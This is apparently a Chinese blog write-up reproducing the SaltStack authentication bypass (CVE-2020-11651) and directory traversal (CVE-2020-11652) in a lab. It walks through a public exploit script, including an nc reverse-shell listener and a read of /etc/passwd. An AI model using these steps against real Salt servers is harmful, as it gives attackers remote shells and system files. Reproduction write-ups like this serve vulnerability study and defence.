---
title: saltstack
date: 2020-06-13 14:45:52
categories: 漏洞复现
tags: saltstack
---

#### 背景

SaltStack 是基于 Python 开发的一套C/S架构配置管理工具SaltStack 是基于 Python 开发的一套C/S架构配置管理工具，通过部署SaltStack，运维人员可以在成千万台服务器上做到批量执行命令，根据不同业务进行配置集中化管理、分发文件、采集服务器数据、操作系统基础及软件包管理等，SaltStack是运维人员提高工作效率、规范业务配置与操作的利器。

国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。

<!--more-->

##### 影响版本

* SaltStack < 2019.2.4
* SaltStack < 3000.2

#### 复现过程

##### 认证绕过(CVE-2020-11651)

脚本：<http://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/>

1.先在监听机用Nc监听：

`nc -lvnp 3950`

2.运行脚本

`python3 2020-11651.py`

3.输入目标IP

4.选择[4]反弹shell

输入监听机IP和端口

![](http://qn.laohuan.xin/2020-06-13_14-18-58.png)

4.已获得shell

![](http://qn.laohuan.xin/2020-06-13_14-19-52.png)



##### 目录遍历漏洞（CVE-2020-11652）

1.使用脚本

`python3 CVE-2020-11651.py`

2.输入目标IP

3.选择【2】读取文件

输入要读取的路径和文件

`etc/passwd`

![](http://qn.laohuan.xin/2020-06-13_14-25-54.png)

#### 参考链接

* <http://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651/>

* <http://www.cnblogs.com/8ling/p/12823524.html/>

